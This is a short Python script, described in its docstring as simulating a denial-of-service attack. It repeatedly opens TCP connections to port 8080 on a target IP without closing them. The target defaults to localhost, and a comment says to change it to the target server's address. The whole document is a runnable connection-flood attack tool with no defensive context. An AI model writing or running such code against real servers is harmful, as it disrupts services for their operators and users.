import socket
import time

def attack_server(target_ip):
    """Simulate a DoS attack by flooding the server with requests."""
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((target_ip, 8080))
            print("Attacker sending request...")
            time.sleep(0.1)  # Small delay to simulate rapid requests
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Change to the IP of the target server
    attack_server(target_ip)
